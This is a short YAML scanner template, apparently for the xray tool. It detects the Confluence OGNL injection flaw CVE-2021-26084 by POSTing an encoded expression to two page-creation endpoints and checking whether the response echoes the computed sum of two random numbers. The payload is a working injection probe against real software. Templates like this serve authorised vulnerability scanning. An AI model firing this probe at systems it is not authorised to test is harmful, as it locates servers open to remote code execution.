name: poc-yaml-confluence-cve-2021-26084-rce
manual: true
transport: http
set:
  r1: randomInt(8000000, 10000000)
  r2: randomInt(8000000, 10000000)
rules:
  confluence1:
    request:
      cache: true
      method: POST
      path: /pages/createpage-entervariables.action
      body: |
        queryString=%5cu0027%2b%7b{{r1}}%2b{{r2}}%7d%2b%5cu0027
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
  confluence2:
    request:
      cache: true
      method: POST
      path: /pages/doenterpagevariables.action
      body: |
        queryString=%5cu0027%2b%7b{{r1}}%2b{{r2}}%7d%2b%5cu0027
    expression: response.status == 403 && response.body.bcontains(bytes(string(r1 + r2)))
expression: confluence1() || confluence2()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2021-26084/README.zh-cn.md
